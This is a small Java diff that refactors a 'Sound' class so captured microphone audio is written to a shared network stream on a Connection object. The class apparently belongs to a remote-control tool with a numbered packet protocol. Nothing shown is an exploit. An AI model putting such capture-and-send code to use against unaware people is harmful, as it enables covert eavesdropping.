@@ -16,7 +16,6 @@ public class Sound implements Runnable {
 	private AudioFormat format;
 	private DataLine.Info info;
 	private TargetDataLine line;
-	private DataOutputStream dos;
 	public boolean running;
 
 	public Sound() {
@@ -52,8 +51,8 @@ public class Sound implements Runnable {
 
 				Connection.addToSendQueue(new Packet58SoundCapture());
 
-				dos.writeInt(data.length);
-				dos.write(data);
+				Connection.dos.writeInt(data.length);
+				Connection.dos.write(data);
 
 				Connection.lock();
 			}
